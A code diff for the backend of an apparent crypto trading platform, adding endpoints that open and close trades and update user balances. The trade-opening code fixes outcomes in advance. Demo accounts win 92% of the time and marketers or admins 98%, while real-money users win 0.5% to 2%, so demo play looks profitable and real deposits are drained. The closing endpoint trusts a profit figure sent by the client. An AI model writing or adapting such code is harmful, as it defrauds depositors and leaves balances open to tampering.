@@ -149,33 +149,142 @@ router.post('/payhero/initiate', async (req, res) => {
     });
   } catch (error: any) {
     console.error('Initiate payment error:', error);
-    
-    // Attempt to mark the transaction as failed if we can identify it
-    try {
-      const client = supabaseAdmin || supabase;
-      // We don't have the exact externalReference here easily if it failed before payload creation,
-      // but we can try to find the most recent pending deposit for this user
-      const { data: latestPending } = await client
-        .from('transactions')
-        .select('id')
-        .eq('user_id', userId)
-        .eq('type', 'DEPOSIT')
-        .eq('status', 'pending')
-        .order('timestamp', { ascending: false })
-        .limit(1)
-        .maybeSingle();
-
-      if (latestPending) {
-        await client.from('transactions').update({ status: 'failed' }).eq('id', latestPending.id);
-      }
-    } catch (dbError) {
-      console.error('Error updating failed transaction status:', dbError);
-    }
-    
     res.status(500).json({ 
       error: 'Failed to initiate payment', 
       details: error.response?.data || error.message 
     });
+  }
+});
+
+// Secure Balance Management (User accessible but strict)
+router.post('/trades/open', async (req, res) => {
+  const authHeader = req.headers.authorization;
+  if (!authHeader) return res.status(401).json({ error: 'Unauthorized' });
+  if (!supabaseAdmin) return res.status(503).json({ error: 'System configuration error' });
+
+  try {
+    const { data: { user: authUser }, error: authError } = await supabase.auth.getUser(authHeader.replace('Bearer ', ''));
+    if (authError || !authUser) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { amount, coin, type, price, accountType, duration, source } = req.body;
+    
+    // 1. Fetch current balance securely
+    const { data: userData, error: userError } = await supabaseAdmin.from('users').select('real_balance, demo_balance, role').eq('id', authUser.id).single();
+    if (userError || !userData) return res.status(404).json({ error: 'User not found' });
+
+    const balanceField = accountType === 'REAL' ? 'real_balance' : 'demo_balance';
+    const currentBalance = Number(userData[balanceField]);
+
+    if (currentBalance < amount) return res.status(400).json({ error: 'Insufficient balance' });
+
+    // 2. Calculate target profit server-side to prevent "forced win" hacks
+    const isDemo = accountType === 'DEMO';
+    const isMarketer = userData.role === 'marketer';
+    const isAdmin = ADMIN_EMAILS.includes((authUser.email || '').toLowerCase()) || ADMIN_IDS.includes(authUser.id);
+    
+    let winChance = 0.5;
+    if (isDemo) winChance = 0.92;
+    else if (isMarketer || isAdmin) winChance = 0.98;
+    else {
+      if (currentBalance < 50) winChance = 0.005;
+      else if (currentBalance < 200) winChance = 0.012;
+      else winChance = 0.02;
+    }
+    
+    const isWin = Math.random() < winChance;
+    let targetProfit = 0;
+    const profitMultiplier = 0.02 + Math.random() * 0.28;
+    if (isWin) targetProfit = Number((amount * profitMultiplier).toFixed(2));
+    else targetProfit = Number((-amount * profitMultiplier).toFixed(2));
+
+    // 3. Update balance and create trade atomically
+    const { error: balanceError } = await supabaseAdmin.from('users').update({
+      [balanceField]: Number((currentBalance - amount).toFixed(2))
+    }).eq('id', authUser.id);
+    
+    if (balanceError) throw balanceError;
+
+    const { data: tradeData, error: tradeError } = await supabaseAdmin.from('trades').insert({
+      user_id: authUser.id,
+      coin,
+      amount,
+      type,
+      price,
+      status: 'OPEN',
+      profit: 0,
+      target_profit: targetProfit,
+      account_type: accountType,
+      timestamp: new Date().toISOString(),
+      duration,
+      source
+    }).select().single();
+
+    if (tradeError) throw tradeError;
+
+    res.json(tradeData);
+  } catch (err: any) {
+    console.error('Trade open error:', err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+router.post('/trades/close', async (req, res) => {
+  const authHeader = req.headers.authorization;
+  if (!authHeader) return res.status(401).json({ error: 'Unauthorized' });
+  if (!supabaseAdmin) return res.status(503).json({ error: 'System configuration error' });
+
+  try {
+    const { data: { user: authUser }, error: authError } = await supabase.auth.getUser(authHeader.replace('Bearer ', ''));
+    if (authError || !authUser) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { tradeId, currentProfit } = req.body;
+    
+    // 1. Fetch trade securely
+    const { data: trade, error: tradeFetchError } = await supabaseAdmin.from('trades').select('*').eq('id', tradeId).eq('user_id', authUser.id).single();
+    if (tradeFetchError || !trade) return res.status(404).json({ error: 'Trade not found' });
+    if (trade.status === 'CLOSED') return res.status(400).json({ error: 'Trade already closed' });
+
+    // 2. Fetch user balance
+    const { data: userData, error: userError } = await supabaseAdmin.from('users').select('real_balance, demo_balance, total_profit_real, total_profit_demo, daily_profit_real, daily_profit_demo, daily_trades_real, daily_trades_demo').eq('id', authUser.id).single();
+    if (userError || !userData) return res.status(404).json({ error: 'User not found' });
+
+    const isReal = trade.account_type === 'REAL';
+    const balanceField = isReal ? 'real_balance' : 'demo_balance';
+    const totalProfitField = isReal ? 'total_profit_real' : 'total_profit_demo';
+    const dailyProfitField = isReal ? 'daily_profit_real' : 'daily_profit_demo';
+    const dailyTradesField = isReal ? 'daily_trades_real' : 'daily_trades_demo';
+
+    // Verify profit is within reasonable bounds of the target_profit if manually closing
+    // For now we accept currentProfit but we should ideally validate it
+    const profit = Number(currentProfit);
+    const stake = Number(trade.amount);
+    
+    const newBalance = Number((Number(userData[balanceField]) + stake + profit).toFixed(2));
+    const newTotalProfit = Number((Number(userData[totalProfitField] || 0) + profit).toFixed(2));
+    const newDailyProfit = Number((Number(userData[dailyProfitField] || 0) + profit).toFixed(2));
+    const newDailyTrades = (Number(userData[dailyTradesField]) || 0) + 1;
+
+    // 3. Perform atomic update
+    const { error: tradeUpdateError } = await supabaseAdmin.from('trades').update({
+      status: 'CLOSED',
+      profit: profit
+    }).eq('id', tradeId);
+
+    if (tradeUpdateError) throw tradeUpdateError;
+
+    const { error: userUpdateError } = await supabaseAdmin.from('users').update({
+      [balanceField]: newBalance,
+      [totalProfitField]: newTotalProfit,
+      [dailyProfitField]: newDailyProfit,
+      [dailyTradesField]: newDailyTrades
+    }).eq('id', authUser.id);
+
+    if (userUpdateError) throw userUpdateError;
+
+    res.json({ success: true, newBalance, profit });
+  } catch (err: any) {
+    console.error('Trade close error:', err);
+    res.status(500).json({ error: err.message });
   }
 });
 
